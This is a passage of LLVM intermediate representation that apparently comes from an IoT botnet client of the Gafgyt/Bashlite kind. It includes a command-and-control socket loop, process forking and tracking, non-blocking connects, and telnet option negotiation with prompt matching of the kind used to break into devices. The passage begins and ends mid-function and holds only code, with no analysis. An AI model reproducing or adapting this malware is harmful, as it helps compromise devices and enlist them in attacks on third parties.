  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #4, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %88

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %83, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %87

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* @mainCommSock, align 4
  %55 = call i32 (i32, i8*, ...) @sockprintf(i32 %54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0))
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  br label %58

; <label>:58:                                     ; preds = %53
  %59 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #4, !srcloc !2
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  br label %67

; <label>:67:                                     ; preds = %58
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  br i1 %82, label %83, label %86

; <label>:83:                                     ; preds = %67
  %84 = load i32, i32* %13, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %13, align 4
  br label %50

; <label>:86:                                     ; preds = %67
  br label %87

; <label>:87:                                     ; preds = %86, %50
  br label %88

; <label>:88:                                     ; preds = %87, %33
  store i32 0, i32* %18, align 4
  %89 = load i8*, i8** %6, align 8
  store i8* %89, i8** %17, align 8
  br label %90

; <label>:90:                                     ; preds = %108, %88
  %91 = load i32, i32* %7, align 4
  %92 = add nsw i32 %91, -1
  store i32 %92, i32* %7, align 4
  %93 = icmp sgt i32 %91, 1
  br i1 %93, label %94, label %111

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i64 @recv(i32 %95, i8* %16, i64 1, i32 0)
  %97 = icmp ne i64 %96, 1
  br i1 %97, label %98, label %100

; <label>:98:                                     ; preds = %94
  %99 = load i8*, i8** %17, align 8
  store i8 0, i8* %99, align 1
  store i32 -1, i32* %4, align 4
  br label %116

; <label>:100:                                    ; preds = %94
  %101 = load i8, i8* %16, align 1
  %102 = load i8*, i8** %17, align 8
  %103 = getelementptr inbounds i8, i8* %102, i32 1
  store i8* %103, i8** %17, align 8
  store i8 %101, i8* %102, align 1
  %104 = load i8, i8* %16, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 10
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %100
  br label %111

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %18, align 4
  %110 = add nsw i32 %109, 1
  store i32 %110, i32* %18, align 4
  br label %90

; <label>:111:                                    ; preds = %107, %90
  %112 = load i8*, i8** %17, align 8
  store i8 0, i8* %112, align 1
  %113 = load i8*, i8** %17, align 8
  %114 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.22, i32 0, i32 0), i8* %113)
  %115 = load i32, i32* %18, align 4
  store i32 %115, i32* %4, align 4
  br label %116

; <label>:116:                                    ; preds = %111, %98
  %117 = load i32, i32* %4, align 4
  ret i32 %117
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #5

declare i64 @recv(i32, i8*, i64, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %100

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %91

; <label>:45:                                     ; preds = %37
  %46 = call i32* @__errno_location() #13
  %47 = load i32, i32* %46, align 4
  %48 = icmp eq i32 %47, 115
  br i1 %48, label %49, label %89

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %51, i64* %52, align 8
  %53 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %53, align 8
  br label %54

; <label>:54:                                     ; preds = %49
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #4, !srcloc !3
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %17, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %18, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %6, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %69 = load i32, i32* %6, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = or i64 %73, %67
  store i64 %74, i64* %72, align 8
  %75 = load i32, i32* %6, align 4
  %76 = add nsw i32 %75, 1
  %77 = call i32 @select(i32 %76, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %78 = icmp sgt i32 %77, 0
  br i1 %78, label %79, label %87

; <label>:79:                                     ; preds = %63
  store i32 4, i32* %13, align 4
  %80 = load i32, i32* %6, align 4
  %81 = bitcast i32* %14 to i8*
  %82 = call i32 @getsockopt(i32 %80, i32 1, i32 4, i8* %81, i32* %13) #4
  %83 = load i32, i32* %14, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %5, align 4
  br label %100

; <label>:86:                                     ; preds = %79
  br label %88

; <label>:87:                                     ; preds = %63
  store i32 0, i32* %5, align 4
  br label %100

; <label>:88:                                     ; preds = %86
  br label %90

; <label>:89:                                     ; preds = %45
  store i32 0, i32* %5, align 4
  br label %100

; <label>:90:                                     ; preds = %88
  br label %91

; <label>:91:                                     ; preds = %90, %37
  %92 = load i32, i32* %6, align 4
  %93 = call i32 (i32, i32, ...) @fcntl(i32 %92, i32 3, i8* null)
  %94 = sext i32 %93 to i64
  store i64 %94, i64* %15, align 8
  %95 = load i64, i64* %15, align 8
  %96 = and i64 %95, -2049
  store i64 %96, i64* %15, align 8
  %97 = load i32, i32* %6, align 4
  %98 = load i64, i64* %15, align 8
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 4, i64 %98)
  store i32 1, i32* %5, align 4
  br label %100

; <label>:100:                                    ; preds = %91, %89, %87, %85, %36
  %101 = load i32, i32* %5, align 4
  ret i32 %101
}

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #4
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #4
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

; <label>:18:                                     ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

; <label>:24:                                     ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

; <label>:34:                                     ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18

; <label>:37:                                     ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #4
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

; <label>:47:                                     ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

; <label>:34:                                     ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

; <label>:46:                                     ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

; <label>:58:                                     ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

; <label>:70:                                     ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

; <label>:72:                                     ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18

; <label>:77:                                     ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

; <label>:95:                                     ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

; <label>:96:                                     ; preds = %77
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11

; <label>:100:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

; <label>:101:                                    ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %136, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

; <label>:42:                                     ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

; <label>:48:                                     ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %137

; <label>:50:                                     ; preds = %48
  br label %51

; <label>:51:                                     ; preds = %50
  %52 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %53 = getelementptr inbounds [16 x i64], [16 x i64]* %52, i64 0, i64 0
  %54 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %53) #4, !srcloc !4
  %55 = extractvalue { i64, i64* } %54, 0
  %56 = extractvalue { i64, i64* } %54, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %24, align 4
  %58 = ptrtoint i64* %56 to i64
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %25, align 4
  br label %60

; <label>:60:                                     ; preds = %51
  %61 = load i32, i32* %10, align 4
  %62 = srem i32 %61, 64
  %63 = zext i32 %62 to i64
  %64 = shl i64 1, %63
  %65 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %66 = load i32, i32* %10, align 4
  %67 = sdiv i32 %66, 64
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [16 x i64], [16 x i64]* %65, i64 0, i64 %68
  %70 = load i64, i64* %69, align 8
  %71 = or i64 %70, %64
  store i64 %71, i64* %69, align 8
  %72 = load i32, i32* %10, align 4
  %73 = add nsw i32 %72, 1
  %74 = call i32 @select(i32 %73, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %75 = icmp slt i32 %74, 1
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %60
  br label %137

; <label>:77:                                     ; preds = %60
  %78 = load i8*, i8** %15, align 8
  %79 = load i32, i32* %18, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  store i8* %81, i8** %23, align 8
  %82 = load i32, i32* %10, align 4
  %83 = load i8*, i8** %23, align 8
  %84 = call i64 @recv(i32 %82, i8* %83, i64 1, i32 0)
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %19, align 4
  %86 = load i32, i32* %19, align 4
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %91, label %88

; <label>:88:                                     ; preds = %77
  %89 = load i32, i32* %19, align 4
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %88, %77
  store i32 0, i32* %9, align 4
  br label %142

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* %19, align 4
  %94 = load i32, i32* %18, align 4
  %95 = add nsw i32 %94, %93
  store i32 %95, i32* %18, align 4
  %96 = load i8*, i8** %23, align 8
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 255
  br i1 %99, label %100, label %122

; <label>:100:                                    ; preds = %92
  %101 = load i32, i32* %10, align 4
  %102 = load i8*, i8** %23, align 8
  %103 = getelementptr inbounds i8, i8* %102, i64 1
  %104 = call i64 @recv(i32 %101, i8* %103, i64 2, i32 0)
  %105 = trunc i64 %104 to i32
  store i32 %105, i32* %19, align 4
  %106 = load i32, i32* %19, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %111, label %108

; <label>:108:                                    ; preds = %100
  %109 = load i32, i32* %19, align 4
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %112

; <label>:111:                                    ; preds = %108, %100
  store i32 0, i32* %9, align 4
  br label %142

; <label>:112:                                    ; preds = %108
  %113 = load i32, i32* %19, align 4
  %114 = load i32, i32* %18, align 4
  %115 = add nsw i32 %114, %113
  store i32 %115, i32* %18, align 4
  %116 = load i32, i32* %10, align 4
  %117 = load i8*, i8** %23, align 8
  %118 = call i32 @negotiate(i32 %116, i8* %117, i32 3)
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %121, label %120

; <label>:120:                                    ; preds = %112
  store i32 0, i32* %9, align 4
  br label %142

; <label>:121:                                    ; preds = %112
  br label %136

; <label>:122:                                    ; preds = %92
  %123 = load i8*, i8** %15, align 8
  %124 = load i8*, i8** %11, align 8
  %125 = call i8* @strstr(i8* %123, i8* %124) #10
  %126 = icmp ne i8* %125, null
  br i1 %126, label %134, label %127

; <label>:127:                                    ; preds = %122
  %128 = load i32, i32* %12, align 4
  %129 = icmp ne i32 %128, 0
  br i1 %129, label %130, label %135

; <label>:130:                                    ; preds = %127
